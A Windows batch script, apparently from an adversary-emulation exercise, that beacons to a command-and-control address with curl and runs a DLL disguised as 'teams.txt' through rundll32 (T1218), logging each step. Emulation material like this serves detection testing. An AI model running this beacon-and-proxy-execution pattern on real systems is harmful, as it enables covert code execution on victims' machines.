@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET douyiw=%APPDATA%\8463\43f815c7
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?8463-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=teams.txt
SET rgnpbq=8463

REM Derived paths
SET lgpdu=%APPDATA%\%fkesh%\macula-simulations.log
SET xvmkj=%APPDATA%\%fkesh%

echo [%DATE% %TIME%][DEBUG][%eykalkg%]: script_started=1>> "%lgpdu%" 2>nul

REM 1. C2 HEARTBEAT
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: heartbeat_start=1>> "%lgpdu%" 2>nul
curl -k -s -o nul "%frytcn%"
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: heartbeat_complete=%errorlevel%>> "%lgpdu%" 2>nul

REM TTP T1218 - Signed Binary Proxy Execution
SET hkjmn=1
SET tafpe=
cd /d "%douyiw%" 2>nul
IF NOT %errorlevel% EQU 0 (
    SET hkjmn=0
    SET tafpe=chdir_failed
)
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: chdir_target=%errorlevel%>> "%lgpdu%" 2>nul

echo [%DATE% %TIME%][DEBUG][%eykalkg%]: dll_load_start=1>> "%lgpdu%" 2>nul
%SystemRoot%\System32\rundll32.exe "%ecrfwq%", DllMain 2>nul
IF NOT %errorlevel% EQU 0 (
    SET hkjmn=0
    SET tafpe=rundll32_failed_!errorlevel!
)
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: dll_load_complete=%errorlevel%>> "%lgpdu%" 2>nul

echo [%DATE% %TIME%][%eykalkg%]: %fkesh%-%rgnpbq%-T1218|Signed Binary Proxy Execution=!hkjmn!:!tafpe!>> "%lgpdu%" 2>nul